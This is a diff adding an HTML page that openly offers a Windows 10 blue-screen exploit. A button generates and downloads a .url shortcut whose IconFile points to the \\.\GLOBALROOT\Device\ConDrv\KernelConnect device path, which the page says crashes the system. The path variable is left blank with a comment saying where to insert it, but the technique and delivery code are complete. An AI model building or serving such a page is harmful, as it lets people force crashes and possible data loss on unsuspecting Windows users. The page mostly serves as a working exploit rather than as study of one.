@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+
+<head>
+    <title>BSOD For Windows 10 - MrK</title>
+    <style>
+        body {
+            background-color: #181a1b;
+            color: #d8d4cf;
+        }
+
+        #bsod-click-download {
+            background-color: #555555;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+        }
+    </style>
+</head>
+
+<body style="display: none;">
+    <div>
+        <p>This uses the \\.\GLOBALROOT\Device\ConDrv\KernelConnect UNC path trick to trigger a BSOD in Windows 10 as
+            seen <a href="https://www.youtube.com/watch?v=JjebNlzX6us">here (link to youtube)</a></p>
+        <p>Warning! Before continuing be aware that this might cause problems to your computer, you are solely
+            responsible if anything bad happens to your it. If you don't agree then close this page. THIS HAS NO WARRANTY!</p>
+        <p>After you click the button the browser will save the file and if it does it will probably crash Windows with
+            a BSOD</p>
+        <p>Tested on Windows 10 PRO Version 2004 Build 19041.746 as of 2021-01-20</p>
+    </div>
+    <div style="text-align: center;">
+        <button id="bsod-click-download">Click for BSOD!</button>
+    </div>
+    <footer>
+        <p>
+            <a href="https://github.com/mdrb97">By Mrk / Mdrb97 in 2021</a>
+        </p>
+    </footer>
+</body>
+
+
+<script>
+    document.addEventListener("DOMContentLoaded", function (event) {
+        alert('Warning! Before continuing be aware that this might cause problems to your computer, you are solely responsible if anything bad happens to your it. If you don\'t agree then close this page. THIS HAS NO WARRANTY!');
+        let clickDownload = document.getElementById('bsod-click-download');
+        clickDownload.addEventListener('click', function () {
+
+            /*
+            *   THIS IS WHERE YOU PUT THE KERNELCONNECT
+            *   UNC PATH!
+            *   THIS IS DANGEROUS SO BE CAREFUL!
+            *   (without it, it is just a .url file to https://github.com/mdrb97 :-D )
+            */
+            let uncPath = "";
+
+            /*
+            * blob payload - this is
+            * just a normal windows .url
+            * shortcut with IconFile set to
+            * the KernelConnect device UNC path
+            */
+            let bsodShortcutFile = (`[{000214A0-0000-0000-C000-000000000046}]\nProp3=19,2\n[InternetShortcut]\nIDList=\nURL=https://github.com/mdrb97\nIconIndex=0\nHotKey=0\nIconFile=${uncPath}}`);
+            let bytes = new Array(bsodShortcutFile.length);
+            for (let i = 0; i < bytes.length; i++) {
+                bytes[i] = bsodShortcutFile.charCodeAt(i);
+            }
+            let blob = new Blob([new Uint8Array(bytes)], { type: "octet/stream" });
+            let url = window.URL.createObjectURL(blob);
+
+            /*
+            * create pseudo element so 
+            * we can trigger a download
+            * append to the document and then 
+            * remove it
+            */
+            let pseudoDownloadElem = document.createElement("a");
+            pseudoDownloadElem.style = "display: none";
+            pseudoDownloadElem.href = url;
+            pseudoDownloadElem.download = "_ohno.url";
+            document.body.appendChild(pseudoDownloadElem);
+            pseudoDownloadElem.click();
+            window.URL.revokeObjectURL(url);
+            pseudoDownloadElem.remove();
+        });
+        document.querySelector('body').style = "";
+    });
+</script>
